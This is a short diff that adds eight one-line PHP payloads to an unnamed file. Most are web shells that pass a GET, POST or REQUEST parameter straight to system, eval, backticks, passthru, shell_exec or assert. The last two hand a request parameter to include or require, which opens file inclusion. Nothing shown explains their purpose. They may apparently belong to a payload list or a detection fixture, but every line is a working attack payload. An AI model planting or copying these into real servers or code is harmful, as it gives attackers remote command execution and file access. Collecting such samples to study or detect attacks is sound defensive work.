@@ -1,0 +1,8 @@
+<?php system($_GET['cmd']); ?>
+<?php eval($_POST['cmd']); ?>
+<?php `$_GET['cmd']`; ?>
+<?php passthru($_REQUEST['cmd']); ?>
+<?php shell_exec($_GET['cmd']); ?>
+<?php assert($_POST['x']); ?>
+<?php include($_GET['file']); ?>
+<?php require($_GET['path']); ?>
